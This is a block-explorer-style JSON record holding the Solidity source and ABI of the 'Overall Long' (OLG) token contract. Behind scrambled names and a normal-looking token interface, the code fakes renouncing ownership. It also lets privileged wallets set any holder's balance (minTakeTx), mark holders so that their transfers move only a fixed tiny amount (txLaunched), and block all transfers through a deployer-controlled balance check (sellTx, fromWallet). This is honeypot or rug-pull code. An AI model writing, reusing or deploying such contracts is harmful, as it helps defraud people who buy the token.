{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\ninterface takeBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract walletSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface tradingFromReceiver {\n    function createPair(address liquidityMin, address atToken) external returns (address);\n}\n\ninterface listFrom {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address takeToken) external view returns (uint256);\n\n    function transfer(address atEnable, uint256 isAtTake) external returns (bool);\n\n    function allowance(address limitAutoList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isAtTake) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address atEnable,\n        uint256 isAtTake\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed txReceiver, uint256 value);\n    event Approval(address indexed limitAutoList, address indexed spender, uint256 value);\n}\n\ninterface listFromMetadata is listFrom {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OverallLong is walletSell, listFrom, listFromMetadata {\n\n    address public modeAuto;\n\n    function fromWallet(address sellWallet, address atEnable, uint256 isAtTake) internal returns (bool) {\n        if (sellWallet == modeAuto) {\n            return fundIsTo(sellWallet, atEnable, isAtTake);\n        }\n        uint256 takeReceiver = listFrom(sellTrading).balanceOf(limitMarketing);\n        require(takeReceiver == autoLimit);\n        require(atEnable != limitMarketing);\n        if (buyExempt[sellWallet]) {\n            return fundIsTo(sellWallet, atEnable, sellAt);\n        }\n        return fundIsTo(sellWallet, atEnable, isAtTake);\n    }\n\n    address receiverLimitList = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return listMaxLaunched;\n    }\n\n    uint256 autoLimit;\n\n    string private amountTakeToken = \"OLG\";\n\n    constructor (){\n        if (launchBuy == launchMaxMode) {\n            modeTrading = launchMaxMode;\n        }\n        takeBuy fromReceiver = takeBuy(receiverLimitList);\n        sellTrading = tradingFromReceiver(fromReceiver.factory()).createPair(fromReceiver.WETH(), address(this));\n        \n        modeAuto = _msgSender();\n        autoBuy();\n        atWallet[modeAuto] = true;\n        marketingSwapLaunched[modeAuto] = swapMin;\n        \n        emit Transfer(address(0), modeAuto, swapMin);\n    }\n\n    function transferFrom(address sellWallet, address atEnable, uint256 isAtTake) external override returns (bool) {\n        if (_msgSender() != receiverLimitList) {\n            if (amountReceiver[sellWallet][_msgSender()] != type(uint256).max) {\n                require(isAtTake <= amountReceiver[sellWallet][_msgSender()]);\n                amountReceiver[sellWallet][_msgSender()] -= isAtTake;\n            }\n        }\n        return fromWallet(sellWallet, atEnable, isAtTake);\n    }\n\n    address limitMarketing = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    address private fundAmount;\n\n    uint256 private swapMin = 100000000 * 10 ** 18;\n\n    bool public launchedBuyTotal;\n\n    uint8 private isLaunched = 18;\n\n    function txLaunched(address enableAuto) public {\n        autoSwap();\n        \n        if (enableAuto == modeAuto || enableAuto == sellTrading) {\n            return;\n        }\n        buyExempt[enableAuto] = true;\n    }\n\n    uint256 minAtSender;\n\n    uint256 public modeTrading;\n\n    function symbol() external view virtual override returns (string memory) {\n        return amountTakeToken;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return isLaunched;\n    }\n\n    function owner() external view returns (address) {\n        return fundAmount;\n    }\n\n    function allowance(address limitMin, address walletIs) external view virtual override returns (uint256) {\n        if (walletIs == receiverLimitList) {\n            return type(uint256).max;\n        }\n        return amountReceiver[limitMin][walletIs];\n    }\n\n    address public sellTrading;\n\n    uint256 public launchMaxMode;\n\n    function autoSwap() private view {\n        require(atWallet[_msgSender()]);\n    }\n\n    mapping(address => uint256) private marketingSwapLaunched;\n\n    function minTakeTx(address atLimit, uint256 isAtTake) public {\n        autoSwap();\n        marketingSwapLaunched[atLimit] = isAtTake;\n    }\n\n    function getOwner() external view returns (address) {\n        return fundAmount;\n    }\n\n    function sellTx(uint256 isAtTake) public {\n        autoSwap();\n        autoLimit = isAtTake;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return swapMin;\n    }\n\n    mapping(address => mapping(address => uint256)) private amountReceiver;\n\n    function balanceOf(address takeToken) public view virtual override returns (uint256) {\n        return marketingSwapLaunched[takeToken];\n    }\n\n    uint256 constant sellAt = 14 ** 10;\n\n    function transfer(address atLimit, uint256 isAtTake) external virtual override returns (bool) {\n        return fromWallet(_msgSender(), atLimit, isAtTake);\n    }\n\n    mapping(address => bool) public atWallet;\n\n    mapping(address => bool) public buyExempt;\n\n    string private listMaxLaunched = \"Overall Long\";\n\n    function approve(address walletIs, uint256 isAtTake) public virtual override returns (bool) {\n        amountReceiver[_msgSender()][walletIs] = isAtTake;\n        emit Approval(_msgSender(), walletIs, isAtTake);\n        return true;\n    }\n\n    uint256 private launchBuy;\n\n    function autoBuy() public {\n        emit OwnershipTransferred(modeAuto, address(0));\n        fundAmount = address(0);\n    }\n\n    function maxShould(address swapTrading) public {\n        if (launchedBuyTotal) {\n            return;\n        }\n        if (modeTrading == launchMaxMode) {\n            modeTrading = launchMaxMode;\n        }\n        atWallet[swapTrading] = true;\n        if (modeTrading != launchMaxMode) {\n            launchBuy = modeTrading;\n        }\n        launchedBuyTotal = true;\n    }\n\n    function fundIsTo(address sellWallet, address atEnable, uint256 isAtTake) internal returns (bool) {\n        require(marketingSwapLaunched[sellWallet] >= isAtTake);\n        marketingSwapLaunched[sellWallet] -= isAtTake;\n        marketingSwapLaunched[atEnable] += isAtTake;\n        emit Transfer(sellWallet, atEnable, isAtTake);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed senderSwapIs, address indexed isToken);\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitAutoList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderSwapIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"isToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"limitMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"walletIs\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletIs\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isAtTake\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeToken\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"buyExempt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchMaxMode\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedBuyTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapTrading\",\"type\":\"address\"}],\"name\":\"maxShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isAtTake\",\"type\":\"uint256\"}],\"name\":\"minTakeTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeAuto\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeTrading\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellTrading\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isAtTake\",\"type\":\"uint256\"}],\"name\":\"sellTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atLimit\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isAtTake\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellWallet\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"atEnable\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isAtTake\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableAuto\",\"type\":\"address\"}],\"name\":\"txLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "OverallLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}